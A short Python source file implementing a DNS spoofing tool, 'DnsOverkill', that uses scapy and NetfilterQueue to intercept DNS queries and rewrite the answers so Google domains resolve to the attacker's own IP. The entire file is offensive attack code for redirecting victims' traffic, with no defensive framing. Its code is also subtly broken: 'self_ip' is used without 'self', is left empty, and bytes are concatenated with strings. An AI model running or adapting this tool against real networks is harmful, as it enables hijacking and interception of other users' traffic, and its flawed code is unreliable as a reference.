import os
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue

class DnsOverkill:
	self_ip = ""

	dns_hosts = {
		b"google.nl" : self_ip,
		b'www.google.nl' : self_ip,
		b'google.com' : self_ip,
		b'www.google.com' : self_ip
	}


	def modify_dns_packet(self, packet):
		qname = packet[DNSQR].qname

		#packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
		packet[DNS].an = DNSRR(rrname=qname, rdata=self_ip)

		packet[DNS].ancount = 1

		del packet[IP].len
		del packet[UDP].len
		del packet[IP].chksum
		del packet[UDP].chksum
		print("DNS packet modified: " + qname)
		return packet


	def process_dns_packet(self, packet):
		scapy_packet = IP(packet.get_payload())
		if scapy_packet.haslayer(DNSQR):
			print("Before: " + scapy_packet.summary())
			try:
				scapy_packet = self.modify_dns_packet(scapy_packet)
			except IndexError:
				pass
			print("After: " + scapy_packet.summary())
			packet.set_payload(bytes(scapy_packet))
		packet.accept()


	def dnsoverkill(self):
		queue_number = 1

		queue = NetfilterQueue()

		queue.bind(queue_number, self.process_dns_packet)
		queue.run()

